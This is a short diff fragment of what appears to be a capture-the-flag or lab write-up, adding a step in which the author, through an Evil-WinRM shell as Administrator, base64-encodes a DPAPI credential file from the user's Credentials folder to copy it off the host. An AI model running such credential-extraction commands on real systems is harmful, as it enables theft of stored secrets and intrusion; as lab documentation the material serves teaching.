@@ -1066,5 +1066,11 @@ echo "AgAAAAAAAAAAAAAANABiADQAYgAwAGYAZABiAC0AOAA0AGIANgAtADQANwA4AGYALQBiADAAOA
 Now the key is saved to my machine 
 
 ```python
+*Evil-WinRM* PS C:\Users\Administrator\AppData\Local\Microsoft\Credentials> [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\Administrator\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D"))
+```
+
+Then ill do the same thing with the credentials file!
+
+```python
 
 ```
